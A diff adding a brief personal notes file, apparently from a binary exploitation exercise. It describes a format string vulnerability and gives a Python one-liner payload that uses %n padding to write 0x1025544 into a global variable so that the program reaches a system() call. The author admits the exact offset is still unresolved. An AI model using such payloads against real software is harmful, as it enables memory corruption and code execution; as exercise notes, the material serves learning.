@@ -1,0 +1,15 @@
+
+0) Random test
+	- Format string vulnerability, the arguments seems to be ignored
+
+Is exactly the same than the exercice 3 ...
+
+I need to set the global variable at 0x8049810 to the value 0x1025544
+to enter into a the work-flow where systhem is executed ...
+
+So the script is:
+
+python -c 'print "\x10\x98\x04\x08"+"%x "*12+"%12$16930116n"'	# %n padding = 16930116 - $(bytes displayed)
+
+// to do : same problems as ex 03, just need to find the right lenght
+	but i m just able to fcking inspect statically ...
